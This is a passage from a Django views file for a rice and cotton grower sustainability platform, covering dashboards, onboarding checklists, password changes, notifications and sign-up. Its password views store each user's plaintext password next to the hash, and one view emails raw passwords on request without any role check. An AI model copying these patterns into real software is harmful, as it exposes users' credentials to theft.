        pop_grower = Grower.objects.filter(id__in = gg_id)
        login_grower_id = request.user.grower.id 
        if login_grower_id in gg_id :
            pop = True
        else:
            pop = ""
        SustainabilitySurvey_data = SustainabilitySurvey.objects.filter(grower_id=request.user.grower.id)
        if SustainabilitySurvey_data.count() == 0:
            Avg_Percentage_Score = 'N/A'
            SustainabilitySurvey_data_latest = 'N/A'
        else:
            Avg_Percentage_Score_data = SustainabilitySurvey_data.aggregate(Avg('sustainabilityscore'))
            Avg_Percentage_Score = int(Avg_Percentage_Score_data['sustainabilityscore__avg'])
            SustainabilitySurvey_data_latest = SustainabilitySurvey_data.order_by('-id')[0].sustainabilityscore
        survey_taken_user = SustainabilitySurvey.objects.filter(grower_id=request.user.grower.id).order_by('-id')[:10]
        recent_users = User.objects.filter(grower_id=request.user.grower.id).order_by('-id')[:10]

        # Grower Checklist =============
        grower_id=request.user.grower.id

        # at starting Grower Contract ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Grower_Contract').count() == 0:
            if SignedContracts.objects.filter(grower_id=grower_id).count() == 0:
                GrowerChecklist(grower_id=request.user.grower.id,item_name='Grower_Contract',checkstatus=False,module='onboarding').save()
            else:
                GrowerChecklist(grower_id=request.user.grower.id,item_name='Grower_Contract',checkstatus=True,module='onboarding').save()
                       
            var = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Grower_Contract')
            var_id = [i.id for i in var][0]
            grower_obj = GrowerChecklist.objects.get(id=var_id)
            onboarding_Grower_contract = grower_obj

        # UPDATE Grower Contract ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Grower_Contract').count() != 0:
            grower_checklist_obj = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Grower_Contract')
            grower_checklist_id = [obj.id for obj in grower_checklist_obj][0]
            grower_obj =GrowerChecklist.objects.get(id=grower_checklist_id)
            if SignedContracts.objects.filter(grower_id=grower_id).count() == 0:
                grower_obj.checkstatus=False
                grower_obj.save()
            else:
                grower_obj.checkstatus=True
                grower_obj.save()

            onboarding_Grower_contract = grower_obj

        # at starting Onboarding Survey 1 ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Onboarding_Survey_1').count() == 0:
            rice_id = TypeSurvey.objects.get(name='Entry Survey - Rice')
            cotton_id = TypeSurvey.objects.get(name='Entry Survey - Cotton')
            namesurvey_rice_id = NameSurvey.objects.get(typesurvey_id =rice_id)
            namesurvey_cotton_id = NameSurvey.objects.get(typesurvey_id =cotton_id)
            rice_check = SustainabilitySurvey.objects.filter(grower_id = grower_id).filter(namesurvey_id=namesurvey_rice_id)
            cotton_check = SustainabilitySurvey.objects.filter(grower_id = grower_id).filter(namesurvey_id=namesurvey_cotton_id)
            if rice_check.count() == 0 or cotton_check.count() == 0:
                GrowerChecklist(grower_id=request.user.grower.id,item_name='Onboarding_Survey_1',checkstatus=False,module='onboarding').save()    
            else:
                GrowerChecklist(grower_id=request.user.grower.id,item_name='Onboarding_Survey_1',checkstatus=True,module='onboarding').save()

            var = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Onboarding_Survey_1')
            var_id = [i.id for i in var][0]
            grower_obj = GrowerChecklist.objects.get(id=var_id)
            onboarding_Grower_Onboarding_Survey_1 = grower_obj
                    
        # UPDATE Onboarding Survey 1 ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Onboarding_Survey_1').count() != 0:
            rice_id = TypeSurvey.objects.get(name='Entry Survey - Rice')
            cotton_id = TypeSurvey.objects.get(name='Entry Survey - Cotton')
            namesurvey_rice_id = NameSurvey.objects.get(typesurvey_id =rice_id)
            namesurvey_cotton_id = NameSurvey.objects.get(typesurvey_id =cotton_id)
            rice_check = SustainabilitySurvey.objects.filter(grower_id = grower_id).filter(namesurvey_id=namesurvey_rice_id)
            cotton_check = SustainabilitySurvey.objects.filter(grower_id = grower_id).filter(namesurvey_id=namesurvey_cotton_id)
            grower_checklist_obj = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Onboarding_Survey_1')
            grower_checklist_id = [obj.id for obj in grower_checklist_obj][0] 
            grower_obj =GrowerChecklist.objects.get(id=grower_checklist_id)
            if rice_check.count() == 0 or cotton_check == 0:
                grower_obj.checkstatus=False
                grower_obj.save() 
            else:
                grower_obj.checkstatus=True
                grower_obj.save()
                
            onboarding_Grower_Onboarding_Survey_1 = grower_obj

        # at starting FSA ID information ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='FSA_ID_information').count() == 0:
            field = Field.objects.filter(grower_id=grower_id)
            fsa_farm_number = [field.fsa_farm_number for field in field]
    
            fsa_field_number = [field.fsa_field_number for field in field]
            if field.count() !=0 :
                if None in fsa_farm_number or None in fsa_field_number:
                    GrowerChecklist(grower_id=request.user.grower.id,item_name='FSA_ID_information',checkstatus=False,module='onboarding').save()
                
                elif not None in fsa_farm_number and not None in fsa_field_number:
                    GrowerChecklist(grower_id=request.user.grower.id,item_name='FSA_ID_information',checkstatus=True,module='onboarding').save()
            else:
                GrowerChecklist(grower_id=request.user.grower.id,item_name='FSA_ID_information',checkstatus=False,module='onboarding').save()
            
            var = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='FSA_ID_information')
            var_id = [i.id for i in var][0]
            grower_obj = GrowerChecklist.objects.get(id=var_id)
            onboarding_Grower_FSA_ID_information = grower_obj

        # UPDATE FSA ID information ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='FSA_ID_information').count() != 0:
            field = Field.objects.filter(grower_id=grower_id)
            fsa_farm_number = [field.fsa_farm_number for field in field]
            fsa_field_number = [field.fsa_field_number for field in field]

            grower_checklist_obj = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='FSA_ID_information')
            grower_checklist_id = [obj.id for obj in grower_checklist_obj][0] 
            grower_obj =GrowerChecklist.objects.get(id=grower_checklist_id)

            if field.count() !=0 :
                if None in fsa_farm_number or None in fsa_field_number:
                    grower_obj.checkstatus=False
                    grower_obj.save()
                
                if not None in fsa_farm_number and not None in fsa_field_number:
                    grower_obj.checkstatus=True
                    grower_obj.save()
            else:
                grower_obj.checkstatus=False
                grower_obj.save()
            onboarding_Grower_FSA_ID_information = grower_obj    

        # # at starting Account information  ......
        # if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Account_information ').count() == 0:
        #     print('No Account information ')

        # # Update Account information  ......
        # if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Account_information ').count() != 0:
        #     print('Exsist Account information  ')

        # at starting Farm fully set up  ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Farm_fully_set_up').count() == 0:
            if Farm.objects.filter(grower_id=grower_id).count() == 0:
                GrowerChecklist(grower_id=request.user.grower.id,item_name='Farm_fully_set_up',checkstatus=False,module='onboarding').save()
            else:
                
                farm_list = Farm.objects.filter(grower_id=grower_id)
                for farm in range(len(farm_list)):
                    
                    name = farm_list[farm].name
                    grower = farm_list[farm].grower
                    area = farm_list[farm].area
                    land_type = farm_list[farm].land_type
                    state = farm_list[farm].state
                    county = farm_list[farm].county
                    village = farm_list[farm].village
                    town = farm_list[farm].town
                    street = farm_list[farm].street
                    zipcode =farm_list[farm].zipcode
                    if name != None and grower != None and area != None and land_type != None and state != None and county != None and village != None and town!=None and street!=None and zipcode!=None:
                        GrowerChecklist(grower_id=request.user.grower.id,item_name='Farm_fully_set_up',checkstatus=True,module='onboarding').save()
                        break
                    else:
                        GrowerChecklist(grower_id=request.user.grower.id,item_name='Farm_fully_set_up',checkstatus=False,module='onboarding').save()
                        break


            var = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Farm_fully_set_up')
            var_id = [i.id for i in var][0]
            grower_obj = GrowerChecklist.objects.get(id=var_id)
            onboarding_Grower_Farm_fully_set_up = grower_obj

        # Update Farm fully set up  ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Farm_fully_set_up').count() != 0:
            var = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Farm_fully_set_up')
            var_id = [i.id for i in var][0]
            grower_obj = GrowerChecklist.objects.get(id=var_id)
            if Farm.objects.filter(grower_id=grower_id).count() == 0:
                grower_obj.checkstatus=False
                grower_obj.save()
            else:
                farm_list = Farm.objects.filter(grower_id=grower_id)
                for farm in range(len(farm_list)):
                    
                    name = farm_list[farm].name
                    grower = farm_list[farm].grower
                    area = farm_list[farm].area
                    land_type = farm_list[farm].land_type
                    state = farm_list[farm].state
                    county = farm_list[farm].county
                    village = farm_list[farm].village
                    town = farm_list[farm].town
                    street = farm_list[farm].street
                    zipcode =farm_list[farm].zipcode
  
                    if name != None and grower != None and area != None and land_type != None and state != None and county != None and village != None and town!=None and street!=None and zipcode!=None:
                        grower_obj.checkstatus=True
                        grower_obj.save()
                    else:
                        grower_obj.checkstatus=False
                        grower_obj.save()
            onboarding_Grower_Farm_fully_set_up = grower_obj

        # at starting Field fully set up  ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Field_fully_set_up').count() == 0:
            if Field.objects.filter(grower_id=grower_id).count() == 0:
                GrowerChecklist(grower_id=request.user.grower.id,item_name='Field_fully_set_up',checkstatus=False,module='onboarding').save()
                
            else:
                # GrowerChecklist(grower_id=request.user.grower.id,item_name='Field_fully_set_up',checkstatus=True,module='onboarding').save()
                               
                field_list = Field.objects.filter(grower_id=grower_id)
                for field in range(len(field_list)):
                    name = field_list[field].name
                    farm = field_list[field].farm
                    grower = field_list[field].grower
                    acreage = field_list[field].acreage
                    fsa_farm_number = field_list[field].fsa_farm_number
                    fsa_field_number = field_list[field].fsa_field_number
                    crop = field_list[field].crop
                    variety = field_list[field].variety
                    if name != None and farm != None and grower != None and acreage != None and fsa_farm_number != None and fsa_field_number != None and crop != None and variety!=None:
                        GrowerChecklist(grower_id=request.user.grower.id,item_name='Field_fully_set_up',checkstatus=True,module='onboarding').save()
                        break
                    else:
                        GrowerChecklist(grower_id=request.user.grower.id,item_name='Field_fully_set_up',checkstatus=False,module='onboarding').save()
                        break

            var = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Field_fully_set_up')
            var_id = [i.id for i in var][0]
            grower_obj = GrowerChecklist.objects.get(id=var_id)
            onboarding_Grower_Field_fully_set_up = grower_obj

        # UPDATE Field fully set up ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Field_fully_set_up').count() != 0:
            var = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Field_fully_set_up')
            var_id = [i.id for i in var][0]
            grower_obj = GrowerChecklist.objects.get(id=var_id)
            if Field.objects.filter(grower_id=grower_id).count() == 0:
                grower_obj.checkstatus=False
                grower_obj.save()                
            else:
                field_list = Field.objects.filter(grower_id=grower_id)
                for field in range(len(field_list)):
                    name = field_list[field].name
                    farm = field_list[field].farm
                    grower = field_list[field].grower
                    acreage = field_list[field].acreage
                    fsa_farm_number = field_list[field].fsa_farm_number
                    fsa_field_number = field_list[field].fsa_field_number
                    crop = field_list[field].crop
                    variety = field_list[field].variety
                    if name != None and farm != None and grower != None and acreage != None and fsa_farm_number != None and fsa_field_number != None and crop != None and variety!=None:
                        grower_obj.checkstatus=True
                        grower_obj.save()
                    else:
                        grower_obj.checkstatus=False
                        grower_obj.save()
                
            onboarding_Grower_Field_fully_set_up = grower_obj

        # at starting .....
        # Shapefile upload for all fields  ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Shapefile_upload_for_all_fields').count() == 0:
            field_id = Field.objects.filter(grower_id=grower_id)
            shp = ShapeFileDataCo.objects.filter(field_id__in=field_id)
            if field_id.count() == shp.count() and shp.count() > 0:
                GrowerChecklist(grower_id=request.user.grower.id,item_name='Shapefile_upload_for_all_fields',checkstatus=True,module='onboarding').save()
            else:
                GrowerChecklist(grower_id=request.user.grower.id,item_name='Shapefile_upload_for_all_fields',checkstatus=False,module='onboarding').save()
            
            var = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Shapefile_upload_for_all_fields')
            var_id = [i.id for i in var][0]
            grower_obj = GrowerChecklist.objects.get(id=var_id)
            onboarding_Grower_Shapefile_upload_for_all_fields = grower_obj

        # at exsiting ......
        # Shapefile upload for all fields  ......
        if GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Shapefile_upload_for_all_fields').count() != 0:
            field_id = Field.objects.filter(grower_id=grower_id)
            shp = ShapeFileDataCo.objects.filter(field_id__in=field_id)
            var = GrowerChecklist.objects.filter(grower_id=grower_id).filter(item_name='Shapefile_upload_for_all_fields')
            var_id = [i.id for i in var][0]
            grower_obj = GrowerChecklist.objects.get(id=var_id)
            if field_id.count() == shp.count() and shp.count() > 0:
                grower_obj.checkstatus=True
                grower_obj.save()
            else:
                grower_obj.checkstatus=False
                grower_obj.save()

            onboarding_Grower_Shapefile_upload_for_all_fields = grower_obj
        
        # For all check ....
        all_check = GrowerChecklist.objects.filter(grower_id=grower_id).filter(checkstatus=False).filter(module='onboarding').count()

        flag = ''
        if all_check == 0:
            flag = 'True'
            # Notification
            var_gower_id = Grower.objects.get(id=grower_id)
            var_consultant_all = var_gower_id.consultant.all()
            var_consultant_id = [i.id for i in var_consultant_all][0]
            var_consultant_username = Consultant.objects.get(id=var_consultant_id).email
            msg1 = f'The {var_gower_id.name} has completed his/her checklist'
            c_user_id = User.objects.get(username=var_consultant_username)
            notification_reason1 = 'Checklist Completion'
            redirect_url1 = "/grower/checklist_comparison/"
            check_noti = ShowNotification.objects.filter(user_id_to_show=c_user_id.id).filter(notification_reason=notification_reason1).filter(msg=msg1)
            if check_noti.exists() :
                pass
            else:
                save_notification = ShowNotification(user_id_to_show=c_user_id.id,msg=msg1,status="UNREAD",redirect_url=redirect_url1,
                notification_reason=notification_reason1)
                save_notification.save()
        return redirect('../grower/grower_dashboard_com/all/')
        # end .....
    else:
        if request.user.is_consultant:
            # do something consultant
            consultant_id = Consultant.objects.get(email= request.user.email).id
            get_growers = Grower.objects.filter(consultant=consultant_id)
            grower_ids = [data.id for data in get_growers]
            
            SustainabilitySurvey_data = SustainabilitySurvey.objects.filter(grower_id__in=grower_ids)
            if SustainabilitySurvey_data.count() == 0:
                Avg_Percentage_Score = 'N/A'
                SustainabilitySurvey_data_latest = 'N/A'
            else:
                Avg_Percentage_Score_data = SustainabilitySurvey_data.aggregate(Avg('sustainabilityscore'))
                Avg_Percentage_Score = int(Avg_Percentage_Score_data['sustainabilityscore__avg'])
                SustainabilitySurvey_data_latest = SustainabilitySurvey_data.order_by('-id')[0].sustainabilityscore

            survey_taken_user = SustainabilitySurvey.objects.filter(grower_id__in=grower_ids).order_by('-id')[:10]
            recent_users = User.objects.filter(grower_id__in=grower_ids).order_by('-id')[:10]

        else:
            # do something allpower
            SustainabilitySurvey_data = SustainabilitySurvey.objects.all()
            if SustainabilitySurvey_data.count() == 0:
                Avg_Percentage_Score = 'N/A'
                SustainabilitySurvey_data_latest = 'N/A'
            else:
                Avg_Percentage_Score_data = SustainabilitySurvey_data.aggregate(Avg('sustainabilityscore'))
                Avg_Percentage_Score = int(Avg_Percentage_Score_data['sustainabilityscore__avg'])
                SustainabilitySurvey_data_latest = SustainabilitySurvey_data.order_by('-id')[0].sustainabilityscore

            survey_taken_user = SustainabilitySurvey.objects.all().order_by('-id')[:10]
            recent_users = User.objects.all().order_by('-id')[:10]

            grower_payment_paid_rice_lst = []
            grower_payment_paid_cotton_lst = []
            ad_total_premium_crop_rice = []
            ad_total_premium_crop_cotton = []
            grower_payment_rice = GrowerPayments.objects.filter(crop="RICE").values('delivery_lbs','sustainability_premium','payment_amount')
            grower_payment_cotton = GrowerPayments.objects.filter(crop="COTTON").values('delivery_lbs','sustainability_premium','payment_amount')
            for r in grower_payment_rice :
                try:
                    grower_payment_paid_rice_lst.append(float(r['payment_amount']))
                    ad_cal_premium_paid = 0.04 * float(r['delivery_lbs'])
                    ad_total_premium_crop_rice.append(ad_cal_premium_paid)
                except:
                    pass
            for c in grower_payment_cotton:
                try:
                    grower_payment_paid_cotton_lst.append(float(c['payment_amount']))
                    cal_premium_paid = float(c['sustainability_premium']) * float(c['delivery_lbs'])
                    ad_total_premium_crop_cotton.append(cal_premium_paid)
                except:
                    pass
            
            sum_grower_payment_paid_rice = "%.2f" % sum(grower_payment_paid_rice_lst)
            sum_grower_payment_paid_cotton = "%.2f" % sum(grower_payment_paid_cotton_lst)
            ad_grower_payment_paid_rice = f"$ {sum_grower_payment_paid_rice}"
            ad_grower_payment_paid_cotton = f"$ {sum_grower_payment_paid_cotton}"

            ad_sum_grower_premium_paid_rice = "%.2f" % sum(ad_total_premium_crop_rice)
            ad_sum_grower_premium_paid_cotton = "%.2f" % sum(ad_total_premium_crop_cotton)
            ad_premium_paid_rice = f"$ {ad_sum_grower_premium_paid_rice}"
            ad_premium_paid_cotton = f"$ {ad_sum_grower_premium_paid_cotton}"
    release_notes = ReleaseNote.objects.filter(status=True)
    all_log = LogTable.objects.all().order_by("-id")[:10]
    some_date = datetime.today().date()
    upcoming_dates = UpcomingDate.objects.filter(status=True,show_date__gte=some_date).order_by('show_date')

    
    return render(request, 'accounts/dashboard.html', {
        'user_count': user_count,
        'survey_count': survey_count,
        'question_count': question_count,
        'recent_users': recent_users,
        'survey_taken_user': survey_taken_user,
        'con_grow_count': con_grow_count,
        'Avg_Percentage_Score': Avg_Percentage_Score,
        'SustainabilitySurvey_data_latest': SustainabilitySurvey_data_latest,
        'release_notes' : release_notes,
	    'all_log' : all_log,
        'upcoming_dates': upcoming_dates,
        'onboarding_Grower_contract':onboarding_Grower_contract,
        'onboarding_Grower_Onboarding_Survey_1':onboarding_Grower_Onboarding_Survey_1,
        'onboarding_Grower_FSA_ID_information':onboarding_Grower_FSA_ID_information,
        'onboarding_Grower_Farm_fully_set_up':onboarding_Grower_Farm_fully_set_up,
        'onboarding_Grower_Field_fully_set_up' : onboarding_Grower_Field_fully_set_up,
        'onboarding_Grower_Shapefile_upload_for_all_fields':onboarding_Grower_Shapefile_upload_for_all_fields,
        'flag':flag,
        'pop':pop,
        'processor':processor,
        'processor2':processor2,
        'distributor': distributor,
        'distributor_user':distributor_user,
        'warehouse_user':warehouse_user,
        'warehouse':warehouse,
        'customer_user':customer_user,
        'customer':customer,
        'p_user':p_user,
        'p2_user':p2_user,
        'pp_grower_payment_paid_rice':pp_grower_payment_paid_rice,
        'pp_grower_payment_paid_cotton':pp_grower_payment_paid_cotton,
        'pp_premium_paid_rice':pp_premium_paid_rice,
        'pp_premium_paid_cotton':pp_premium_paid_cotton,
        'ad_grower_payment_paid_rice':ad_grower_payment_paid_rice,
        'ad_grower_payment_paid_cotton':ad_grower_payment_paid_cotton,
        'ad_premium_paid_rice':ad_premium_paid_rice,
        'ad_premium_paid_cotton':ad_premium_paid_cotton,
        'contract_count': contract_count,
        'warehouse_count': warehouse_count,
        'distributor_warehouses':distributor_warehouses,
        'unpaid_warehouse_shipments':unpaid_warehouse_shipments,
        'unpaid_processor_shipments':unpaid_processor_shipments,
        "total_warehouse_amount":total_warehouse_amount,
        "total_processor_amount": total_processor_amount,
    })



class EmailSendView(LoginRequiredMixin, View):
    """Generic Class Based View to re send emails to grower"""

    def get(self, request, pk):
        obj = Grower.objects.get(pk=pk)
        user = User.objects.get(grower_id=obj.id)
        email = user.email
        username = user.username
        password = user.password_raw
        send_user_login_notification(user, False, [email], username, password)
        return redirect('account-list')

@login_required()
def change_password(request):
    context={}
    if request.user.is_superuser:
        return redirect('dashboard')
    else:
        user = User.objects.get(id=request.user.id)
        context["user"] = user
        if request.method == "POST":
            password1 = request.POST.get("password1")
            password2 = request.POST.get("password2")
            if password1 != None and password2 != None and password1 == password2 :
                if user.is_processor:
                    p_user = ProcessorUser.objects.get(contact_email=user.email)
                    password = make_password(password1)
                    user.password = password
                    user.password_raw = password1
                    user.save()
                    p_user.p_password_raw = password1
                    p_user.save()
                elif user.is_processor2:
                    p_user = ProcessorUser2.objects.get(contact_email=user.email)
                    password = make_password(password1)
                    user.password = password
                    user.password_raw = password1
                    user.save()
                    p_user.p_password_raw = password1
                    p_user.save()
                elif user.is_distributor:
                    p_user = DistributorUser.objects.get(contact_email=user.email)
                    password = make_password(password1)
                    user.password = password
                    user.password_raw = password1
                    user.save()
                    p_user.p_password_raw = password1
                    p_user.save()
                elif user.is_warehouse_manager:
                    p_user = WarehouseUser.objects.get(contact_email=user.email)
                    password = make_password(password1)
                    user.password = password
                    user.password_raw = password1
                    user.save()
                    p_user.p_password_raw = password1
                    p_user.save()
                elif user.is_customer:
                    p_user = CustomerUser.objects.get(contact_email=user.email)
                    password = make_password(password1)
                    user.password = password
                    user.password_raw = password1
                    user.save()
                    p_user.p_password_raw = password1
                    p_user.save()
                else:
                    password = make_password(password1)
                    user.password = password
                    user.password_raw = password1
                    user.save()
                # 07-04-23  Log Table                                       
                log_type, log_status, log_device = "User", "Password changed", "Web"
                log_idd, log_name = user.id, f'{user.first_name} {user.last_name}'
                log_email = user.username
                role = user.role.all()
                var_role = [i.role for i in role][0]
                log_details = f"name = {user.first_name} {user.last_name} | phone = {user.phone} | email = {user.email} | role = {var_role}"
                action_by_userid = request.user.id
                user = User.objects.get(pk=action_by_userid)
                userr_role = user.role.all()
                action_by_username = f'{user.first_name} {user.last_name}'
                action_by_email = user.username
                if request.user.id == 1 :
                    action_by_role = "superuser"
                else:
                    action_by_role = str(','.join([str(i.role) for i in userr_role]))
                logtable = LogTable(log_type=log_type,log_status=log_status,log_idd=log_idd,log_name=log_name,
                                    action_by_userid=action_by_userid,action_by_username=action_by_username,
                                    action_by_email=action_by_email,action_by_role=action_by_role,log_email=log_email,
                                    log_details=log_details,log_device=log_device)
                logtable.save()
                messages.success(request,"Password changed successfully, please relogin.")
        return render (request, 'accounts/change_password.html', context)


@login_required()
def user_change_password(request,pk):
    context={}
    if request.user.is_superuser or 'SubAdmin' in request.user.get_role() or 'SuperUser' in request.user.get_role():
        if pk != 1 :
            userr = User.objects.get(id=pk)
            context["userr"] = userr
            if request.method == "POST":
                password1 = request.POST.get("password1")
                password2 = request.POST.get("password2")
                if len(password1) != 0 and len(password2) != 0 and password1 != None and password2 != None and password1 == password2:
                    update_pass_user = User.objects.get(id=pk)
                    password = make_password(password1)
                    update_pass_user.password = password
                    update_pass_user.password_raw = password1
                    update_pass_user.save()

                    # 07-04-23                                        
                    log_type, log_status, log_device = "User", "Password changed", "Web"
                    log_idd, log_name = update_pass_user.id, f'{update_pass_user.first_name} {update_pass_user.last_name}'
                    log_email = update_pass_user.username
                    role = update_pass_user.role.all()
                    var_role = [i.role for i in role][0]
                    log_details = f"name = {update_pass_user.first_name} {update_pass_user.last_name} | phone = {update_pass_user.phone} | email = {update_pass_user.email} | role = {var_role}"
                    action_by_userid = request.user.id
                    user = User.objects.get(pk=action_by_userid)
                    user_role = user.role.all()
                    action_by_username = f'{user.first_name} {user.last_name}'
                    action_by_email = user.username
                    if request.user.id == 1 :
                        action_by_role = "superuser"
                    else:
                        action_by_role = str(','.join([str(i.role) for i in user_role]))
                    logtable = LogTable(log_type=log_type,log_status=log_status,log_idd=log_idd,log_name=log_name,
                                        action_by_userid=action_by_userid,action_by_username=action_by_username,
                                        action_by_email=action_by_email,action_by_role=action_by_role,log_email=log_email,
                                        log_details=log_details,log_device=log_device)
                    logtable.save()
                    
                    messages.success(request,"Password changed successfully!")
            return render (request, 'accounts/user_change_password.html', context)
        else:
            return redirect('dashboard')
    else:
        return redirect ("/")


@login_required()
def show_notification_counter(request):
    user_id = request.user.id
    data = ShowNotification.objects.filter(user_id_to_show=user_id).filter(status='UNREAD')
    return JsonResponse({'msg_count':data.count()})

@login_required()
def show_notification(request):
    user_id = request.user.id
    # print("user_id",user_id)
    data = ShowNotification.objects.filter(user_id_to_show=user_id).order_by('-status','-id')[:10]
    # print("data",data)
    lst = []
    for i in data :
        msg = i.msg
        link = i.redirect_url
        notification_reason = i.notification_reason
        status = i.status
        added_data_time = i.added_data_time.strftime("%d %b, %Y, %I%p")
        data = {
            "msg":msg,
            "myhref":link,
            "status":status,
            "notification_reason":notification_reason,
            "added_data_time":added_data_time,
        }
        lst.append(data)
        update_data = ShowNotification.objects.get(id=i.id)
        update_data.status = "READ"
        update_data.save()
    
    return JsonResponse({'msg':lst})


@login_required()
def show_log(request):
    context = {}
    if request.user.is_superuser or 'SubAdmin' in request.user.get_role() or 'SuperUser' in request.user.get_role():
        example_length = 100
        all_log = LogTable.objects.all().order_by("-id")
        context["get_from_date"] = str(all_log.last().action_datetime).split(" ")[0] 
        context["get_to_date"] = str(all_log.first().action_datetime).split(" ")[0]
        # ?log_type=User&log_status=&from_date=&to_date=
        log_type = request.GET.get("log_type")
        log_status = request.GET.get("log_status")
        from_date = request.GET.get("from_date")
        to_date = request.GET.get("to_date")
        get_example_length = request.GET.get("example_length")

        if log_type and log_type != "" :
            all_log = all_log.filter(log_type=log_type)
            context["get_log_type"] = log_type
        if log_status and log_status !="" :
            all_log = all_log.filter(log_status=log_status)
            context["get_log_status"] = log_status
        if from_date and to_date and to_date > from_date :
            date_1 = datetime.datetime.strptime(to_date, '%Y-%m-%d')
            var_to_date = date_1 + datetime.timedelta(days=1)
            all_log = all_log.filter(action_datetime__range=[from_date, var_to_date])
            context["get_from_date"] = from_date
            context["get_to_date"] = to_date
        
        if get_example_length :
            example_length = int(get_example_length)

        context["get_example_length"] = example_length
        paginator = Paginator(all_log, example_length)
        page = request.GET.get('page')
        try:
            report = paginator.page(page)
        except PageNotAnInteger:
            report = paginator.page(1)
        except EmptyPage:
            report = paginator.page(paginator.num_pages)
        context["all_log"] = report
        return render (request, 'accounts/show_log.html', context)
    else:
        return redirect('dashboard')
    
def reverseTuple(lstOfTuple):
    return [tup[::-1] for tup in lstOfTuple]

def grower_sign_up(request):
    context = {}
    if request.user.is_authenticated :
        return redirect ('dashboard')
    else:
        pass
    if request.method == 'POST' :
        first_name = request.POST.get('first_name')
        last_name = request.POST.get('last_name')
        username = request.POST.get('username')
        password1 = request.POST.get('password1')
        password2 = request.POST.get('password2')
        address = request.POST.get('address')
        city = request.POST.get('city')
        phone = request.POST.get('phone')
        state = request.POST.get('state')
        zip_code = request.POST.get('zip_code')

        farm_name = request.POST.get('farm_name')
        farm_address = request.POST.get('farm_address')
        farm_crop = request.POST.get('farm_crop')
        farm_city = request.POST.get('farm_city')
        farm_state = request.POST.get('farm_state')
        farm_zip_code = request.POST.get('farm_zip_code')
        farm_Nutrien_id = request.POST.get('farm_Nutrien_id')
        farm_counter = request.POST.get('counter1')

        select_farm_for_field = request.POST.get('select_farm_for_field')
        field_name = request.POST.get('field_name')
        field_acreage = request.POST.get('field_acreage')
        field_cultivation_year = request.POST.get('field_cultivation_year')
        field_FSA_Farm_number = request.POST.get('field_FSA_Farm_number')
        field_FSA_Track_number = request.POST.get('field_FSA_Track_number')
        field_FSA_Field_number = request.POST.get('field_FSA_Field_number')
        field_shape_file = request.FILES.get('field_shape_file')
        field_counter = request.POST.get('counter2')

        check_user = User.objects.filter(username=username,email=username)
        check_user2 = User.objects.filter(phone=phone)
        check_grower = Grower.objects.filter(email=username)
        check_grower2 = Grower.objects.filter(phone=phone)
        

        if check_user.exists() or check_grower.exists() :
            context['error_msg'] = 'email already exists'
            return render (request,'update-step-form/step.html',context)
        elif check_user2.exists() or check_grower2.exists() :
            context['error_msg'] = 'phone number already exists'
            return render (request,'update-step-form/step.html',context)
        else:
            print('create user .....')
            try:
                zip_code = zip_code if zip_code else None
                # Grower Save
                grower_name = f"{first_name} {last_name}" if last_name else f"{first_name}"
                save_grower = Grower(name=grower_name,phone=phone,email=username,physical_address1=address,physical_address2=address,
                                city1=city,state1=state,zip_code1=zip_code)

                save_grower.save()

                # User Update
                user = User.objects.get(email=username)
                password = make_password(password1)
                user.password = password
                user.password_raw = password1            
                user.save()

                if farm_name :
                    check_farm = Farm.objects.filter(name=farm_name)
                    if check_farm.exists() :
                        context['error_msg'] = "Farm name already Exixts"
                        try:
                            save_grower.delete()
                        except:
                            pass
                        try:
                            user.delete()
                        except:
                            pass
                        return render (request,'update-step-form/step.html',context)
                    else:
                        var_zipcode = farm_zip_code if farm_zip_code else None
                        save_farm = Farm(name=farm_name,grower_id=save_grower.id,land_type=farm_crop,state=farm_state,
                                        village=farm_city,zipcode=var_zipcode,nutrien_account_id=farm_Nutrien_id,town=farm_address,
                                        cultivation_year=field_cultivation_year)
                        save_farm.save()

                        if select_farm_for_field and field_name :
                            check_field = Field.objects.filter(name=field_name)
                            if check_field.exists():
                                context['error_msg'] = "Field name already Exixts"
                                try:
                                    save_grower.delete()
                                except:
                                    pass
                                try:
                                    user.delete()
                                except:
                                    pass
                                return render (request,'update-step-form/step.html',context)
                            else:
                                save_field = Field(name=field_name,grower_id=save_grower.id,farm_id=save_farm.id,crop=save_farm.land_type ,acreage=field_acreage,
                                                   fsa_farm_number=field_FSA_Farm_number,fsa_tract_number=field_FSA_Track_number,fsa_field_number=field_FSA_Field_number)
                                                
                                                
                                save_field.save()
                                # ShapeFile Data Add
                                if field_shape_file :
                                    sf = shapefile.Reader(field_shape_file.temporary_file_path())
                                    # Reading shapeFile id & update fields eschlon_id point 
                                    features = sf.shapeRecords()
                                    for feat in features:
                                        eschlon_id = feat.record["id"]
                                    Field.objects.filter(id=save_field.id).update(eschlon_id=eschlon_id)
                                    rec = sf.shapeRecords()[0]
                                    points = rec.shape.points
                                    lat_lon_set = reverseTuple(points)
                                    chk_poly_data = ShapeFileDataCo.objects.filter(field_id=save_field.id)
                                
                                    if chk_poly_data.count() == 0:

                                        shape_file_data = ShapeFileDataCo(
                                            coordinates=lat_lon_set, field_id=save_field.id)
                                        shape_file_data.save()
